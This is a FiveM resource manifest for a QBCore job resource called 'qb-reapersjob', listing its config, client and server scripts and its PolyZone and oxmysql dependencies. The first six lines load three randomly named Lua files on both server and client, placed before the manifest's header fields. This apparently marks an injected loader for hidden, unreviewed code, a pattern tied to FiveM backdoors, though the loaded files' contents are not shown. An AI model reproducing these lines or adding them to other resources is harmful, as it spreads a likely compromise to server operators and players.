server_script "BB5L6S7MT6WTN.lua"
client_script "BB5L6S7MT6WTN.lua"
server_script "50CE3GMC.lua"
client_script "50CE3GMC.lua"
server_script "Z81E5KGRLFANA87.lua"
client_script "Z81E5KGRLFANA87.lua"
fx_version 'cerulean'
game 'gta5'

description 'qb-reapersjob'
version '2.0.0'

shared_script 'config.lua'

client_scripts {
	'client/main.lua',
	'client/drivingdistance.lua',
	'@PolyZone/client.lua',
	'@PolyZone/BoxZone.lua',
	'@PolyZone/CircleZone.lua',
}

server_scripts {
	'@oxmysql/lib/MySQL.lua',
	'server/main.lua'
}

lua54 'yes'
